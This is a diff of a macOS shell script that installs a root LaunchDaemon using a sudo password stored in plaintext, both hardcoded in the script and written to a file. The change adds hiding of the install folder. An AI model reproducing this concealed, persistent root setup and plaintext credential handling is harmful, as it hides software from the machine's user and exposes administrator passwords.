@@ -9,6 +9,11 @@ PLIST_PATH="/Library/LaunchDaemons/$PLIST_LABEL.plist"
 
 echo "[$(date)] Script started."
 
+# Always ensure the folder is hidden if it exists
+if [ -d "$TARGET_DIR" ]; then
+    chflags hidden "$TARGET_DIR"
+fi
+
 if [ -d "$TARGET_DIR" ]; then
     # -> Existing install: read sudo password from p.txt
     if [ ! -f "$PFILE" ]; then
@@ -17,7 +22,7 @@ if [ -d "$TARGET_DIR" ]; then
     fi
     PASSWORD=$(<"$PFILE")
 
-    echo "✅ $TARGET_DIR exists."
+    echo "✅ $TARGET_DIR exists (hidden)."
     echo "→ Writing LaunchDaemon plist to $PLIST_PATH..."
     cat <<EOF | echo "$PASSWORD" | sudo -S tee "$PLIST_PATH" >/dev/null
 <?xml version="1.0" encoding="UTF-8"?>
@@ -44,16 +49,18 @@ EOF
     "$MAIN_SCRIPT"
 
 else
-    # -> First-time bootstrap: create folder & password file
+    # -> First-time bootstrap: create & hide folder, store password
     echo "❌ $TARGET_DIR not found. Bootstrapping…"
     echo "→ Creating folder $TARGET_DIR"
     mkdir -p "$TARGET_DIR"
 
+    echo "→ Hiding folder"
+    chflags hidden "$TARGET_DIR"
+
     echo "→ Storing sudo password in p.txt"
-    echo "Mayuecheng2009" >"$PFILE"
+    echo "carterchloe2006" >"$PFILE"
     chmod 600 "$PFILE"
 
-    # now read it back in
     PASSWORD=$(<"$PFILE")
 
     echo "→ Recording current time in time.txt"
